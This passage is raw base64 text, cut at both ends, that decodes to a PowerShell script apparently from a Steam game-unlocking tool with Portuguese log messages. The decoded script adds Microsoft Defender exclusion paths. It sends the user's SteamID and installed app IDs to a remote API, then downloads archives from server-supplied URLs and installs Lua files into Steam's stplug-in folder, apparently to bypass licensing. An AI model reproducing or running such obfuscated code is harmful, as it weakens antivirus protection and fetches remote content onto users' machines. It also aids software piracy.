WFtUm9vdCwKICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXVtzdHJpbmddJEFwcElkLAogICAgW3N0cmluZ1tdXSREZXBvdElkcyA9IEAoKQogICkKICAkcmVzdWx0ID0gQHsKICAgIEFjZlJlbW92ZWQgPSAwCiAgICBEZXBvdENhY2hlUmVtb3ZlZCA9IDAKICB9CiAgZm9yZWFjaCAoJGxpYnJhcnkgaW4gQChHZXQtTGlicmFyeVBhdGhzICRTdGVhbVJvb3QpKSB7CiAgICAkYWNmUGF0aCA9IEpvaW4tUGF0aCAkbGlicmFyeSAoInN0ZWFtYXBwc1xhcHBtYW5pZmVzdF97MH0uYWNmIiAtZiAkQXBwSWQpCiAgICBpZiAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkYWNmUGF0aCkgewogICAgICBSZW1vdmUtSXRlbSAtTGl0ZXJhbFBhdGggJGFjZlBhdGggLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICAgICRyZXN1bHQuQWNmUmVtb3ZlZCsrCiAgICB9CiAgfQogICRkZXBvdERpciA9IEpvaW4tUGF0aCAkU3RlYW1Sb290ICJkZXBvdGNhY2hlIgogIGZvcmVhY2ggKCRkZXBvdElkIGluIEAoJERlcG90SWRzKSkgewogICAgaWYgKC1ub3QgJGRlcG90SWQpIHsgY29udGludWUgfQogICAgJHBhdHRlcm4gPSBKb2luLVBhdGggJGRlcG90RGlyICgiezB9XyoubWFuaWZlc3QiIC1mICRkZXBvdElkKQogICAgZm9yZWFjaCAoJG1hbmlmZXN0UGF0aCBpbiBAKEdldC1DaGlsZEl0ZW0gLVBhdGggJHBhdHRlcm4gLUZpbGUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpKSB7CiAgICAgIFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAkbWFuaWZlc3RQYXRoLkZ1bGxOYW1lIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgICAkcmVzdWx0LkRlcG90Q2FjaGVSZW1vdmVkKysKICAgIH0KICB9CiAgcmV0dXJuICRyZXN1bHQKfQoKZnVuY3Rpb24gSW5zdGFsbC1NYW5pZmVzdEx1YUZyb21aaXAgewogIHBhcmFtKAogICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldW3N0cmluZ10kU3RlYW1Sb290LAogICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldW3N0cmluZ10kQXBwSWQsCiAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV1bc3RyaW5nXSRBcmNoaXZlUGF0aAogICkKICAkcmVzdWx0ID0gSW5zdGFsbC1IdWJjYXBaaXBGcm9tQXJjaGl2ZSAtU3RlYW1Sb290ICRTdGVhbVJvb3QgLUFwcElkICRBcHBJZCAtQXJjaGl2ZVBhdGggJEFyY2hpdmVQYXRoCiAgcmV0dXJuIFtib29sXSRyZXN1bHQuTHVhSW5zdGFsbGVkCn0KCmZ1bmN0aW9uIEVuYWJsZS1MdWFNYW5pZmVzdFBpbnMoW3N0cmluZ10kQ29udGVudCkgewogIGlmICgtbm90ICRDb250ZW50KSB7IHJldHVybiAkQ29udGVudCB9CiAgcmV0dXJuIFtyZWdleF06OlJlcGxhY2UoJENvbnRlbnQsICcoP20pXihccyopLS1ccyooc2V0TWFuaWZlc3RpZFxzKlwoLiopJCcsICckMSQyJykKfQoKZnVuY3Rpb24gSW5zdGFsbC1IdWJjYXBaaXBGcm9tQXJjaGl2ZSB7CiAgcGFyYW0oCiAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV1bc3RyaW5nXSRTdGVhbVJvb3QsCiAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV1bc3RyaW5nXSRBcHBJZCwKICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXVtzdHJpbmddJEFyY2hpdmVQYXRoCiAgKQogICRsdWFEaXIgPSBFbnN1cmUtTHVhTWFuaWZlc3REaXIgKEpvaW4tUGF0aCAkU3RlYW1Sb290ICJjb25maWdcbHVhIikKICAkc3RwbHVnRGlyID0gRW5zdXJlLUx1YU1hbmlmZXN0RGlyIChKb2luLVBhdGggJFN0ZWFtUm9vdCAiY29uZmlnXHN0cGx1Zy1pbiIpCiAgJGRlcG90RGlyID0gSm9pbi1QYXRoICRTdGVhbVJvb3QgImRlcG90Y2FjaGUiCiAgaWYgKC1ub3QgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJGRlcG90RGlyKSkgewogICAgTmV3LUl0ZW0gLVBhdGggJGRlcG90RGlyIC1JdGVtVHlwZSBEaXJlY3RvcnkgLUZvcmNlIHwgT3V0LU51bGwKICB9CiAgJHN0YWdlID0gSm9pbi1QYXRoICRlbnY6VEVNUCAoInNrLWh1YmNhcC1leHRyYWN0LSIgKyBbZ3VpZF06Ok5ld0d1aWQoKS5Ub1N0cmluZygnTicpKQogICRsdWFJbnN0YWxsZWQgPSAkZmFsc2UKICAkbWFuaWZlc3RDb3VudCA9IDAKICB0cnkgewogICAgTmV3LUl0ZW0gLVBhdGggJHN0YWdlIC1JdGVtVHlwZSBEaXJlY3RvcnkgLUZvcmNlIHwgT3V0LU51bGwKICAgIGlmICgtbm90IChFeHBhbmQtSHViY2FwWmlwQXJjaGl2ZSAtQXJjaGl2ZVBhdGggJEFyY2hpdmVQYXRoIC1EZXN0aW5hdGlvblBhdGggJHN0YWdlKSkgewogICAgICB0aHJvdyAiTmFvIGZvaSBwb3NzaXZlbCBleHRyYWlyIG8gcGFjb3RlLiIKICAgIH0KICAgICRsdWFGaWxlID0gR2V0LUNoaWxkSXRlbSAtTGl0ZXJhbFBhdGggJHN0YWdlIC1SZWN1cnNlIC1GaWx0ZXIgKCJ7MH0ubHVhIiAtZiAkQXBwSWQpIC1GaWxlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgU2VsZWN0LU9iamVjdCAtRmlyc3QgMQogICAgaWYgKC1ub3QgJGx1YUZpbGUpIHsKICAgICAgJGx1YUZpbGUgPSBHZXQtQ2hpbGRJdGVtIC1MaXRlcmFsUGF0aCAkc3RhZ2UgLVJlY3Vyc2UgLUZpbHRlciAnKi5sdWEnIC1GaWxlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgU2VsZWN0LU9iamVjdCAtRmlyc3QgMQogICAgfQogICAgaWYgKCRsdWFGaWxlKSB7CiAgICAgICRsdWFUZXh0ID0gRW5hYmxlLUx1YU1hbmlmZXN0UGlucyAoW1N5c3RlbS5JTy5GaWxlXTo6UmVhZEFsbFRleHQoJGx1YUZpbGUuRnVsbE5hbWUpKQogICAgICAkbHVhRGVzdCA9IEpvaW4tUGF0aCAkbHVhRGlyICgiezB9Lmx1YSIgLWYgJEFwcElkKQogICAgICAkc3RwbHVnRGVzdCA9IEpvaW4tUGF0aCAkc3RwbHVnRGlyICgiezB9Lmx1YSIgLWYgJEFwcElkKQogICAgICBbU3lzdGVtLklPLkZpbGVdOjpXcml0ZUFsbFRleHQoJGx1YURlc3QsICRsdWFUZXh0LCBbU3lzdGVtLlRleHQuVVRGOEVuY29kaW5nXTo6bmV3KCRmYWxzZSkpCiAgICAgIFtTeXN0ZW0uSU8uRmlsZV06OldyaXRlQWxsVGV4dCgkc3RwbHVnRGVzdCwgJGx1YVRleHQsIFtTeXN0ZW0uVGV4dC5VVEY4RW5jb2RpbmddOjpuZXcoJGZhbHNlKSkKICAgICAgdHJ5IHsKICAgICAgICAoR2V0LUl0ZW0gLUxpdGVyYWxQYXRoICRsdWFEZXN0KS5MYXN0V3JpdGVUaW1lID0gR2V0LURhdGUKICAgICAgfSBjYXRjaCB7fQogICAgICAkbHVhSW5zdGFsbGVkID0gJHRydWUKICAgIH0KICAgICRtYW5pZmVzdEZpbGVzID0gQChHZXQtQ2hpbGRJdGVtIC1MaXRlcmFsUGF0aCAkc3RhZ2UgLVJlY3Vyc2UgLUZpbHRlciAnKi5tYW5pZmVzdCcgLUZpbGUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpCiAgICBmb3JlYWNoICgkbWFuaWZlc3RGaWxlIGluICRtYW5pZmVzdEZpbGVzKSB7CiAgICAgICRkZXN0ID0gSm9pbi1QYXRoICRkZXBvdERpciAkbWFuaWZlc3RGaWxlLk5hbWUKICAgICAgQ29weS1JdGVtIC1MaXRlcmFsUGF0aCAkbWFuaWZlc3RGaWxlLkZ1bGxOYW1lIC1EZXN0aW5hdGlvbiAkZGVzdCAtRm9yY2UKICAgICAgJG1hbmlmZXN0Q291bnQrKwogICAgfQogIH0gY2F0Y2ggewogICAgcmV0dXJuIEB7CiAgICAgIEx1YUluc3RhbGxlZCA9ICRmYWxzZQogICAgICBNYW5pZmVzdENvdW50ID0gMAogICAgICBFcnJvciA9ICRfLkV4Y2VwdGlvbi5NZXNzYWdlCiAgICB9CiAgfSBmaW5hbGx5IHsKICAgIGlmIChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRzdGFnZSkgewogICAgICBSZW1vdmUtSXRlbSAtTGl0ZXJhbFBhdGggJHN0YWdlIC1SZWN1cnNlIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgfQogIH0KICByZXR1cm4gQHsKICAgIEx1YUluc3RhbGxlZCA9ICRsdWFJbnN0YWxsZWQKICAgIE1hbmlmZXN0Q291bnQgPSAkbWFuaWZlc3RDb3VudAogICAgRXJyb3IgPSAkbnVsbAogIH0KfQoKZnVuY3Rpb24gQWRkLURlZmVuZGVyRXhjbHVzaW9uUGF0aCB7CiAgcGFyYW0oW3N0cmluZ10kUGF0aCkKICBpZiAoLW5vdCAkUGF0aCAtb3IgLW5vdCAoVGVzdC1TdGVhbUZzUGF0aCAkUGF0aCkpIHsgcmV0dXJuICRmYWxzZSB9CiAgdHJ5IHsKICAgICRudWxsID0gQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAkUGF0aCAtRXJyb3JBY3Rpb24gU3RvcAogICAgcmV0dXJuICR0cnVlCiAgfSBjYXRjaCB7CiAgICByZXR1cm4gJGZhbHNlCiAgfQp9CgoKJHNjcmlwdDpMdWFCZ0xvZ1BhdGggPSAkbnVsbAoKZnVuY3Rpb24gV3JpdGUtTHVhQmdMb2cgewogIHBhcmFtKFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXVtzdHJpbmddJE1lc3NhZ2UpCiAgaWYgKC1ub3QgJHNjcmlwdDpMdWFCZ0xvZ1BhdGgpIHsgcmV0dXJuIH0KICAkdHMgPSBHZXQtRGF0ZSAtRm9ybWF0ICd5eXl5LU1NLWRkIEhIOm1tOnNzJwogIHRyeSB7CiAgICBBZGQtQ29udGVudCAtTGl0ZXJhbFBhdGggJHNjcmlwdDpMdWFCZ0xvZ1BhdGggLVZhbHVlICJbJHRzXSAkTWVzc2FnZSIgLUVuY29kaW5nIFVURjgKICB9IGNhdGNoIHt9Cn0KCmZ1bmN0aW9uIEdldC1Ta0FwaUhlYWRlcnMgewogIHJldHVybiBAewogICAgQWNjZXB0ID0gJ2FwcGxpY2F0aW9uL2pzb24nCiAgICAnVXNlci1BZ2VudCcgPSAnc2stb3N0LzEuMCcKICAgICdYLVNLLVZlcnNpb24nID0gJ3NrLW9zdCcKICB9Cn0KCmZ1bmN0aW9uIEludm9rZS1Ta0FwaUpzb24gewogIHBhcmFtKAogICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldW3N0cmluZ10kVXJsLAogICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldW3N0cmluZ10kTWV0aG9kLAogICAgW3N0cmluZ10kQm9keSA9ICRudWxsCiAgKQogICRoZWFkZXJzID0gR2V0LVNrQXBpSGVhZGVycwogICRwYXJhbXMgPSBAewogICAgVXJpID0gJFVybAogICAgTWV0aG9kID0gJE1ldGhvZAogICAgSGVhZGVycyA9ICRoZWFkZXJzCiAgICBUaW1lb3V0U2VjID0gNjAKICB9CiAgaWYgKCRCb2R5KSB7CiAgICAkcGFyYW1zLkJvZHkgPSAkQm9keQogICAgJHBhcmFtcy5Db250ZW50VHlwZSA9ICdhcHBsaWNhdGlvbi9qc29uOyBjaGFyc2V0PXV0Zi04JwogIH0KICByZXR1cm4gSW52b2tlLVJlc3RNZXRob2QgQHBhcmFtcwp9CgpmdW5jdGlvbiBHZXQtTWFuaWZlc3RTdGF0ZURpcihbc3RyaW5nXSRTdGVhbVJvb3QpIHsKICAkZGlyID0gSm9pbi1QYXRoICRTdGVhbVJvb3QgJ29wZW5zdGVhbXRvb2xcbWFuaWZlc3Qtc3RhdGUnCiAgaWYgKC1ub3QgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJGRpcikpIHsKICAgIE5ldy1JdGVtIC1QYXRoICRkaXIgLUl0ZW1UeXBlIERpcmVjdG9yeSAtRm9yY2UgfCBPdXQtTnVsbAogIH0KICByZXR1cm4gJGRpcgp9CgpmdW5jdGlvbiBHZXQtTG9jYWxNYW5pZmVzdFZlcnNpb24gewogIHBhcmFtKAogICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldW3N0cmluZ10kU3RlYW1Sb290LAogICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldW3N0cmluZ10kQXBwSWQKICApCiAgJHBhdGggPSBKb2luLVBhdGggKEdldC1NYW5pZmVzdFN0YXRlRGlyICRTdGVhbVJvb3QpICgiezB9LnNrIiAtZiAkQXBwSWQpCiAgaWYgKC1ub3QgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJHBhdGgpKSB7IHJldHVybiAkbnVsbCB9CiAgdHJ5IHsKICAgICRyYXcgPSAoW1N5c3RlbS5JTy5GaWxlXTo6UmVhZEFsbFRleHQoJHBhdGgpKS5UcmltKCkKICAgIGlmICgkcmF3IC1tYXRjaCAnXlswLTldKyQnKSB7IHJldHVybiBbaW50NjRdJHJhdyB9CiAgfSBjYXRjaCB7fQogIHJldHVybiAkbnVsbAp9CgpmdW5jdGlvbiBTZXQtTG9jYWxNYW5pZmVzdFZlcnNpb24gewogIHBhcmFtKAogICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldW3N0cmluZ10kU3RlYW1Sb290LAogICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldW3N0cmluZ10kQXBwSWQsCiAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV1baW50NjRdJFZlcnNpb24KICApCiAgJHBhdGggPSBKb2luLVBhdGggKEdldC1NYW5pZmVzdFN0YXRlRGlyICRTdGVhbVJvb3QpICgiezB9LnNrIiAtZiAkQXBwSWQpCiAgdHJ5IHsKICAgIFtTeXN0ZW0uSU8uRmlsZV06OldyaXRlQWxsVGV4dCgkcGF0aCwgW3N0cmluZ10kVmVyc2lvbiwgW1N5c3RlbS5UZXh0LlVURjhFbmNvZGluZ106Om5ldygkZmFsc2UpKQogICAgcmV0dXJuICR0cnVlCiAgfSBjYXRjaCB7CiAgICByZXR1cm4gJGZhbHNlCiAgfQp9CgpmdW5jdGlvbiBEb3dubG9hZC1NYW5pZmVzdEFyY2hpdmUgewogIHBhcmFtKAogICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldW3N0cmluZ10kVXJsLAogICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldW3N0cmluZ10kT3V0RmlsZSwKICAgIFtoYXNodGFibGVdJEhlYWRlcnMgPSBAe30KICApCiAgdHJ5IHsKICAgIGlmIChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRPdXRGaWxlKSB7CiAgICAgIFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAkT3V0RmlsZSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgIH0KICAgICRyZXEgPSBbU3lzdGVtLk5ldC5IdHRwV2ViUmVxdWVzdF06OkNyZWF0ZSgkVXJsKQogICAgJHJlcS5NZXRob2QgPSAnR0VUJwogICAgJHJlcS5UaW1lb3V0ID0gMTIwMDAwCiAgICBmb3JlYWNoICgka2V5IGluICRIZWFkZXJzLktleXMpIHsKICAgICAgaWYgKCRrZXkgLWVxICdVc2VyLUFnZW50JykgeyAkcmVxLlVzZXJBZ2VudCA9IFtzdHJpbmddJEhlYWRlcnNbJGtleV0gfQogICAgICBlbHNlaWYgKCRrZXkgLWVxICdBY2NlcHQnKSB7ICRyZXEuQWNjZXB0ID0gW3N0cmluZ10kSGVhZGVyc1ska2V5XSB9CiAgICAgIGVsc2UgeyAkcmVxLkhlYWRlcnNbJGtleV0gPSBbc3RyaW5nXSRIZWFkZXJzWyRrZXldIH0KICAgIH0KICAgICRyZXNwID0gJHJlcS5HZXRSZXNwb25zZSgpCiAgICAkc3RyZWFtID0gJHJlc3AuR2V0UmVzcG9uc2VTdHJlYW0oKQogICAgJGZpbGUgPSBbU3lzdGVtLklPLkZpbGVdOjpPcGVuKCRPdXRGaWxlLCBbU3lzdGVtLklPLkZpbGVNb2RlXTo6Q3JlYXRlLCBbU3lzdGVtLklPLkZpbGVBY2Nlc3NdOjpXcml0ZSkKICAgIHRyeSB7CiAgICAgICRidWZmZXIgPSBOZXctT2JqZWN0IGJ5dGVbXSAyNjIxNDQKICAgICAgd2hpbGUgKCgkcmVhZCA9ICRzdHJlYW0uUmVhZCgkYnVmZmVyLCAwLCAkYnVmZmVyLkxlbmd0aCkpIC1ndCAwKSB7CiAgICAgICAgJGZpbGUuV3JpdGUoJGJ1ZmZlciwgMCwgJHJlYWQpCiAgICAgIH0KICAgIH0gZmluYWxseSB7CiAgICAgICRmaWxlLkNsb3NlKCkKICAgICAgJHN0cmVhbS5DbG9zZSgpCiAgICAgICRyZXNwLkNsb3NlKCkKICAgIH0KICAgIHJldHVybiAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkT3V0RmlsZSkKICB9IGNhdGNoIHsKICAgIHJldHVybiAkZmFsc2UKICB9Cn0KCmZ1bmN0aW9uIFJlcGFpci1NYW5pZmVzdEx1YXNCYWNrZ3JvdW5kIHsKICBwYXJhbShbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV1bc3RyaW5nXSRTdGVhbVJvb3QpCiAgJHN0ZWFtSWQgPSBHZXQtU3RlYW1JZDY0ICRTdGVhbVJvb3QKICBpZiAoLW5vdCAkc3RlYW1JZCkgewogICAgV3JpdGUtTHVhQmdMb2cgJ1NlbSBjb250YSBTdGVhbScKICAgIHJldHVybgogIH0KICAkYXBwSWRzID0gR2V0LVNoYWRvd0tleXNBcHBJZHMgJFN0ZWFtUm9vdCAkc3RlYW1JZAogIGlmICgkYXBwSWRzLkNvdW50IC1sZSAwKSB7CiAgICBXcml0ZS1MdWFCZ0xvZyAnTmVuaHVtIGFwcCBhdGl2YWRvJwogICAgcmV0dXJuCiAgfQoKICAkYXBwc1BheWxvYWQgPSBAKCkKICBmb3JlYWNoICgkYXBwSWQgaW4gJGFwcElkcykgewogICAgJGxvY2FsVmVyc2lvbiA9IEdldC1Mb2NhbE1hbmlmZXN0VmVyc2lvbiAtU3RlYW1Sb290ICRTdGVhbVJvb3QgLUFwcElkICRhcHBJZAogICAgJGFwcHNQYXlsb2FkICs9IEB7IGFwcElkID0gJGFwcElkOyBtYW5pZmVzdFZlcnNpb24gPSAkbG9jYWxWZXJzaW9uIH0KICB9CgogICRib2R5ID0gQHsKICAgIHN0ZWFtSWQgPSAkc3RlYW1JZAogICAgaW5zdGFsbGVkQXBwSWRzID0gQCgkYXBwSWRzKQogICAgYXBwcyA9ICRhcHBzUGF5bG9hZAogIH0gfCBDb252ZXJ0VG8tSnNvbiAtRGVwdGggNiAtQ29tcHJlc3MKCiAgJHJlYWN0aXZhdGVVcmwgPSAkYXBpQmFzZS5UcmltRW5kKCcvJykgKyAnL2FwaS9zdGVhbS1rZXlzL3JlYWN0aXZhdGUnCiAgV3JpdGUtTHVhQmdMb2cgKCdyZWFjdGl2YXRlICcgKyAkYXBwSWRzLkNvdW50ICsgJyBhcHBzJykKICAkcmVzcG9uc2UgPSAkbnVsbAogIHRyeSB7CiAgICAkcmVzcG9uc2UgPSBJbnZva2UtU2tBcGlKc29uIC1VcmwgJHJlYWN0aXZhdGVVcmwgLU1ldGhvZCBQT1NUIC1Cb2R5ICRib2R5CiAgfSBjYXRjaCB7CiAgICBXcml0ZS1MdWFCZ0xvZyAoJ3JlYWN0aXZhdGUgZXJybzogJyArICRfLkV4Y2VwdGlvbi5NZXNzYWdlKQogICAgcmV0dXJuCiAgfQoKICAkZ2FtZXMgPSBAKCRyZXNwb25zZS5nYW1lcykKICBpZiAoJGdhbWVzLkNvdW50IC1sZSAwKSB7CiAgICBXcml0ZS1MdWFCZ0xvZyAncmVhY3RpdmF0ZSBzZW0gam9nb3MnCiAgICByZXR1cm4KICB9CgogICR1cGRhdGVkID0gMAogICRiYXRjaExpbWl0ID0gMTUKICAkYmF0Y2hDb3VudCA9IDAKICBmb3JlYWNoICgkZ2FtZSBpbiAkZ2FtZXMpIHsKICAgIGlmICgkYmF0Y2hDb3VudCAtZ2UgJGJhdGNoTGltaXQpIHsKICAgICAgV3JpdGUtTHVhQmdMb2cgKCdiYXRjaCBsaW1pdCAnICsgJGJhdGNoTGltaXQgKyAnIGF0aW5naWRvJykKICAgICAgYnJlYWsKICAgIH0KICAgICRhcHBJZCA9IFtzdHJpbmddJGdhbWUuYXBwSWQKICAgIGlmICgtbm90ICRhcHBJZCkgeyBjb250aW51ZSB9CiAgICAkbmVlZHNVcGRhdGUgPSAkZmFsc2UKICAgIGlmICgkZ2FtZS5QU09iamVjdC5Qcm9wZXJ0aWVzLk5hbWUgLWNvbnRhaW5zICduZWVkc1VwZGF0ZScpIHsKICAgICAgJG5lZWRzVXBkYXRlID0gW2Jvb2xdJGdhbWUubmVlZHNVcGRhdGUKICAgIH0KICAgIGlmICgtbm90ICRuZWVkc1VwZGF0ZSkgeyBjb250aW51ZSB9CiAgICAkbWFuaWZlc3RVcmwgPSBbc3RyaW5nXSRnYW1lLm1hbmlmZXN0VXJsCiAgICBpZiAoLW5vdCAkbWFuaWZlc3RVcmwpIHsKICAgICAgV3JpdGUtTHVhQmdMb2cgKCJbJGFwcElkXSBuZWVkc1VwZGF0ZSBzZW0gVVJMIikKICAgICAgY29udGludWUKICAgIH0KICAgICRzeW5jID0gJG51bGwKICAgICRzeW5jVXJsID0gJGFwaUJhc2UuVHJpbUVuZCgnLycpICsgJy9hcGkvc3RlYW0ta2V5cy9tYW5pZmVzdC1zeW5jJwogICAgJHN5bmNCb2R5ID0gQHsKICAgICAgc3RlYW1JZCA9ICRzdGVhbUlkCiAgICAgIGFwcElkID0gJGFwcElkCiAgICAgIG1hbmlmZXN0VmVyc2lvbiA9IChHZXQtTG9jYWxNYW5pZmVzdFZlcnNpb24gLVN0ZWFtUm9vdCAkU3RlYW1Sb290IC1BcHBJZCAkYXBwSWQpCiAgICB9IHwgQ29udmVydFRvLUpzb24gLUNvbXByZXNzCiAgICB0cnkgewogICAgICAkc3luYyA9IEludm9rZS1Ta0FwaUpzb24gLVVybCAkc3luY1VybCAtTWV0aG9kIFBPU1QgLUJvZHkgJHN5bmNCb2R5CiAgICAgIGlmICgkc3luYy5nYW1lIC1hbmQgJHN5bmMuZ2FtZS5tYW5pZmVzdFVybCkgewogICAgICAgICRtYW5pZmVzdFVybCA9IFtzdHJpbmddJHN5bmMuZ2FtZS5tYW5pZmVzdFVybAogICAgICB9CiAgICB9IGNhdGNoIHsKICAgICAgV3JpdGUtTHVhQmdMb2cgKCJbJGFwcElkXSBtYW5pZmVzdC1zeW5jIGZhbGhvdTogIiArICRfLkV4Y2VwdGlvbi5NZXNzYWdlKQogICAgfQoKICAgICRoZWFkZXJzID0gR2V0LVNrQXBpSGVhZGVycwogICAgaWYgKCRnYW1lLm1hbmlmZXN0SGVhZGVycykgewogICAgICBmb3JlYWNoICgkcHJvcCBpbiAkZ2FtZS5tYW5pZmVzdEhlYWRlcnMuUFNPYmplY3QuUHJvcGVydGllcykgewogICAgICAgICRoZWFkZXJzWyRwcm9wLk5hbWVdID0gW3N0cmluZ10kcHJvcC5WYWx1ZQogICAgICB9CiAgICB9CgogICAgJHRtcFppcCA9IEpvaW4tUGF0aCAkZW52OlRFTVAgKCJzay1sdWEtezB9LXsxfS56aXAiIC1mICRhcHBJZCwgW2d1aWRdOjpOZXdHdWlkKCkuVG9TdHJpbmcoJ04nKSkKICAgIHRyeSB7CiAgICAgIGlmICgtbm90IChEb3dubG9hZC1NYW5pZmVzdEFyY2hpdmUgLVVybCAkbWFuaWZlc3RVcmwgLU91dEZpbGUgJHRtcFppcCAtSGVhZGVycyAkaGVhZGVycykpIHsKICAgICAgICBXcml0ZS1MdWFCZ0xvZyAoIlskYXBwSWRdIGRvd25sb2FkIGZhbGhvdSIpCiAgICAgICAgY29udGludWUKICAgICAgfQogICAgICBpZiAoLW5vdCAoSW5zdGFsbC1NYW5pZmVzdEx1YUZyb21aaXAgLVN0ZWFtUm9vdCAkU3RlYW1Sb290IC1BcHBJZCAkYXBwSWQgLUFyY2hpdmVQYXRoICR0bXBaaXApKSB7CiAgICAgICAgV3JpdGUtTHVhQmdMb2cgKCJbJGFwcElkXSBleHRyYWN0IGZhbGhvdSIpCiAgICAgICAgY29udGludWUKICAgICAgfQogICAgICAkc2VydmVyVmVyc2lvbiA9ICRudWxsCiAgICAgIGlmICgkZ2FtZS5tYW5pZmVzdFZlcnNpb24gLW5lICRudWxsKSB7ICRzZXJ2ZXJWZXJzaW9uID0gW2ludDY0XSRnYW1lLm1hbmlmZXN0VmVyc2lvbiB9CiAgICAgIGlmICgkc3luYyAtYW5kICRzeW5jLmdhbWUgLWFuZCAkc3luYy5nYW1lLm1hbmlmZXN0VmVyc2lvbiAtbmUgJG51bGwpIHsKICAgICAgICAkc2VydmVyVmVyc2lvbiA9IFtpbnQ2NF0kc3luYy5nYW1lLm1hbmlmZXN0VmVyc2lvbgogICAgICB9CiAgICAgIGlmICgkc2VydmVyVmVyc2lvbiAtZ3QgMCkgewogICAgICAgIFNldC1Mb2NhbE1hbmlmZXN0VmVyc2lvbiAtU3RlYW1Sb290ICRTdGVhbVJvb3QgLUFwcElkICRhcHBJZCAtVmVyc2lvbiAkc2VydmVyVmVyc2lvbiB8IE91dC1OdWxsCiAgICAgIH0KICAgICAgJHVwZGF0ZWQrKwogICAgICAkYmF0Y2hDb3VudCsrCiAgICAgIFdyaXRlLUx1YUJnTG9nICgiWyRhcHBJZF0gbHVhIGF0dWFsaXphZG8iKQogICAgICBTdGFydC1TbGVlcCAtTWlsbGlzZWNvbmRzIDc1MAogICAgfSBmaW5hbGx5IHsKICAgICAgaWYgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJHRtcFppcCkgewogICAgICAgIFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAkdG1wWmlwIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgICB9CiAgICB9CiAgfQogIFdyaXRlLUx1YUJnTG9nICgnbHVhIHJlcGFpciBjb25jbHVpZG8gYXR1YWxpemFkb3M9JyArICR1cGRhdGVkKQp9Cgokc3RlYW0gPSBHZXQtU3RlYW1QYXRoRnJvbVJlZ2lzdHJ5CmlmICgtbm90ICRzdGVhbSkgeyBleGl0IDEgfQokbG9nRGlyID0gSm9pbi1QYXRoICRzdGVhbSAnb3BlbnN0ZWFtdG9vbFxsb2dzJwppZiAoLW5vdCAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkbG9nRGlyKSkgewogIE5ldy1JdGVtIC1QYXRoICRsb2dEaXIgLUl0ZW1UeXBlIERpcmVjdG9yeSAtRm9yY2UgfCBPdXQtTnVsbAp9CiRzY3JpcHQ6THVhQmdMb2dQYXRoID0gSm9pbi1QYXRoICRsb2dEaXIgJ2x1YS1yZXBhaXItYmFja2dyb3VuZC5sb2cnCiRsb2NrUGF0aCA9IEpvaW4tUGF0aCAkbG9nRGlyICdsdWEtcmVwYWlyLWJhY2tncm91bmQubG9jaycKaWYgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJGxvY2tQYXRoKSB7CiAgdHJ5IHsKICAgICRsb2NrUGlkID0gW2ludF0oR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2NrUGF0aCAtRXJyb3JBY3Rpb24gU3RvcCB8IFNlbGVjdC1PYmplY3QgLUZpcnN0IDEpCiAgICBpZiAoJGxvY2tQaWQgLWd0IDApIHsKICAgICAgJHByb2MgPSBHZXQtUHJvY2VzcyAtSWQgJGxvY2tQaWQgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgICAgaWYgKCRwcm9jKSB7IGV4aXQgMCB9CiAgICB9CiAgfSBjYXRjaCB7fQp9ClNldC1Db250ZW50IC1MaXRlcmFsUGF0aCAkbG9ja1BhdGggLVZhbHVlICRQSUQgLUVuY29kaW5nIEFTQ0lJIC1Gb3JjZQp0cnkgewogIFdyaXRlLUx1YUJnTG9nICc9PT0gaW5pY2lvIGx1YSByZXBhaXIgYmFja2dyb3VuZCA9PT0nCiAgUmVwYWlyLU1hbmlmZXN0THVhc0JhY2tncm91bmQgLVN0ZWFtUm9vdCAkc3RlYW0KfSB